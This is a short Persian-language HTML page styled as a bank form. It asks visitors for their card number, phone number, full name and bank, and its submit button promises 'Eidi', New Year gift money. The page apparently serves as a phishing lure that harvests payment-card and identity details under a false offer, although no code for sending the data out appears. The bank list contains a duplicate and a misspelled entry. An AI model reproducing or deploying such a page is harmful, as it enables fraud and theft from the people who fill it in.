<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فرم بانکی</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            direction: rtl;
            text-align: right;
            background-color: #f4f7fa;
            margin: 0;
            padding: 0;
        }
        .form-container {
            width: 350px;
            margin: 100px auto;
            padding: 25px;
            border: 1px solid #ccc;
            border-radius: 10px;
            background-color: #fff;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
        .form-container h2 {
            text-align: center;
            font-size: 24px;
            color: #2c3e50;
            margin-bottom: 20px;
        }
        .form-container label {
            display: block;
            font-size: 14px;
            margin-bottom: 5px;
            color: #34495e;
        }
        .form-container input, .form-container select {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #bdc3c7;
            border-radius: 5px;
            background-color: #ecf0f1;
            font-size: 16px;
            color: #34495e;
        }
        .form-container input:focus, .form-container select:focus {
            outline: none;
            border-color: #3498db;
            background-color: #ffffff;
        }
        .form-container button {
            width: 100%;
            padding: 14px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }
        .form-container button:hover {
            background-color: #2980b9;
        }
        .form-container .note {
            text-align: center;
            font-size: 14px;
            color: #95a5a6;
        }
    </style>
</head>
<body>

    <div class="form-container">
        <h2>فرم بانکی</h2>
        <form action="eid.html">
            <label for="cardNumber">شماره کارت:</label>
            <input type="text" id="cardNumber" name="cardNumber" required>
            
            <label for="phoneNumber">شماره تلفن:</label>
            <input type="tel" id="phoneNumber" name="phoneNumber" required>
            
            <label for="fullName">نام و نام خانوادگی:</label>
            <input type="text" id="fullName" name="fullName" required>
            
            <label for="bankName">نام بانک:</label>
            <select id="bankName" name="bankName" required>
                <option value="صادرات">بانک صادرات</option>
                <option value="کشاورزی">بانک کشاورزی</option>
                <option value="ملت">بانک ملت</option>
                <option value="توسعه">بانک توسعه</option>
                <option value="سپه">بانک سپه</option>
                <option value="پارسیان">بانک پارسیان</option>
                <option value="تجارت">بانک تجارت</option>
                <option value="سایپا">بانک سایپا</option>
                <option value="پاسارگاد">بانک پاسارگاد</option>
                <option value="بمِه ایران">بانک بیمه ایران</option>
                <option value="مسکن">بانک مسکن</option>
                <option value="کشاورزی">بانک کشاورزی</option>
                <option value="مناطق آزاد">بانک مناطق آزاد</option>
                <option value="شهری">بانک شهری</option>
                <option value="سایر">سایر</option>
            </select>
            
            <button type="submit">دریافت عیدی</button>
        </form>
        <p class="note">لطفاً اطلاعات خود را با دقت وارد کنید.</p>
    </div>

</body>
</html>
